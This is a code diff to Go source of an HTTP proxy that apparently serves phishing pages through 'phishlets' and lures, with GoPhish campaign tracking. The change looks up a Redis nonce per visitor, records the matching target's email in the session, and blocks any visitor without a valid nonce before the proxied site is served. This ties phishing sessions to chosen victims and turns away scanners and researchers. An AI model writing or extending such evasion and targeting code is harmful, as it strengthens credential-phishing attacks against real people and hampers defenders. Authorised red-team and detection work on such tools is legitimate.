@@ -384,27 +384,34 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								email := ""
 								email_insert := ""
-								if p.cfg.GetRedisEnabled() {
-									rdb := redis.NewClient(&redis.Options{
-									    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
-									    Password: p.cfg.GetRedisPassword(),
-									    DB:       p.cfg.GetRedisDB(), 
-									})
-									nonce := req.URL.Query().Get("k")
-									log.Info("Nonce: %s",nonce)
-									email, err = rdb.GetDel(ctxbg, nonce).Result()
-									if err != nil {
-										log.Warning("Redis error %s. Rejecting request", err)
-										return req, goproxy.NewResponse(req, "text/plain", http.StatusOK, "")
-									}
-									email_insert = email + " (Nonce: " + nonce + ") "
-								}
+								
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									// set params from url arguments
 									p.extractParams(session, req.URL)
+
+									if p.cfg.GetRedisEnabled() {
+										if nonce, ok := session.Params["nonce"]; ok {
+											log.Info("Nonce: %s",nonce)
+											rdb := redis.NewClient(&redis.Options{
+											    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
+											    Password: p.cfg.GetRedisPassword(),
+											    DB:       p.cfg.GetRedisDB(), 
+											})
+											email, err := rdb.Get(ctxbg, nonce).Result()
+											if err != nil {
+												log.Warning("Redis error %s. Nonce %s not verified", err, nonce)
+												email_insert = "Email not found (Nonce: " + nonce + ") "
+											} else {
+												session.Params["email"] = email;
+												email_insert = email + " (Nonce: " + nonce + ") "
+											}
+										} else {
+											log.Warning("Nonce not found in params.")
+											email_insert = "(Nonce not found in params) "
+										}
+									}
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										if trackParam, ok := session.Params["o"]; ok {
@@ -600,6 +607,37 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								//log.Warning("lure: template file does not exist: %s", path)
 							}
 						}
+					}
+				}
+
+				// Kick out invalid sessions or sessions without a valid nonce, and revoke the nonce if valid, before serving pages of the origin site
+				if p.cfg.GetRedisEnabled() {
+					if s, ok := p.sessions[ps.SessionId]; ok {
+						if nonce, ok2 := s.Params["nonce"]; ok2 {
+							if email, ok3 := s.Params["email"]; ok3 {
+								log.Info("[%s] Valid session. Email: %s. Nonce: %s.", hiblue.Sprint(pl_name), email, nonce)
+								log.Info("[%s] Deleting nonce: %s.", hiblue.Sprint(pl_name), nonce)
+								rdb := redis.NewClient(&redis.Options{
+								    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
+								    Password: p.cfg.GetRedisPassword(),
+								    DB:       p.cfg.GetRedisDB(), 
+								})
+								_, err := rdb.Del(ctxbg, nonce).Result()
+								if err != nil {
+									log.Warning("Redis error %s. Nonce %s might not be successfully deleted", err, nonce)
+								}
+							} else {
+								log.Warning("[%s] Session with invalid nonce: %s %s (%s) [%s]", hiblue.Sprint(pl_name), nonce, req_url, req.Header.Get("User-Agent"), remote_addr)
+								return p.blockRequest(req)
+							}
+
+						} else {
+							log.Warning("[%s] No nonce in session: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+							return p.blockRequest(req)
+						}
+					} else {
+						log.Warning("[%s] Invalid session: %s %s (%s) [%s]", hiblue.Sprint(pl_name), ps.SessionId, req_url, req.Header.Get("User-Agent"), remote_addr)
+						return p.blockRequest(req)
 					}
 				}
 
